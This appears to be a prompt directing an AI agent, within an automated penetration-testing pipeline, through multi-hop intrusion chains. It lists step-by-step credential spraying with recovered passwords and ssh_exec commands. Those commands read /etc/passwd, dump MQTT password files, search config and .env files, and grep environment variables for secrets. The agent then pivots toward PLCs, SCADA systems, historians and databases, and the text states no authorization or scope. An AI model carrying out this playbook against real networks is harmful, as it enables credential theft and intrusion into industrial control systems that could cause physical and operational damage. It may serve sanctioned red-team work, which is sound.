<instructions>
## Step 1 — Read context (2 calls max)

1. read_deliverable("05_intrusion_context.json")
   → gives you: entry_points, recovered_credentials, attack_chains

2. read_deliverable("04_exploitation.json")
   → gives you: confirmed exploits with evidence (credentials, file contents found)

## Step 2 — Execute attack chains

**For each chain (max 3), follow this pattern:**

### a) Gain initial access on entry point
Use try_credential(entry_ip, service, user, password) with each recovered credential.
Once one succeeds → you have access to this device.

### b) Enumerate the compromised device
Use ssh_exec to harvest credentials and understand the network position:
- ssh_exec(ip, user, password, "cat /etc/passwd; id; hostname")
- ssh_exec(ip, user, password, "find /etc /home /var -name '*.conf' -o -name '*.env' 2>/dev/null | head -20")
- ssh_exec(ip, user, password, "cat /etc/mosquitto/passwd 2>/dev/null || cat /etc/mqtt*.conf 2>/dev/null")
- ssh_exec(ip, user, password, "env | grep -i 'pass\|pwd\|key\|secret\|token'")
- ssh_exec(ip, user, password, "ip route; cat /etc/hosts")

### c) Identify next pivot target
From the attack_chains in the context, identify the next device reachable from the current one.
Use the network topology (routes/hosts) to confirm reachability.

### d) Test harvested credentials on the next hop
try_credential(next_ip, service, harvested_user, harvested_password)
If success → you have pivoted. Continue from step b) on the new device.

### e) Continue until crown jewel reached or chain exhausted
Crown jewels: PLCs (modbus/s7comm), databases (MySQL/Redis), historians, SCADA systems.
When you reach one: ssh_exec or try_credential to confirm access. Document the impact.

## Step 3 — Save deliverable

Call save_deliverable("05_intrusion.json", content) with the full results.
</instructions>
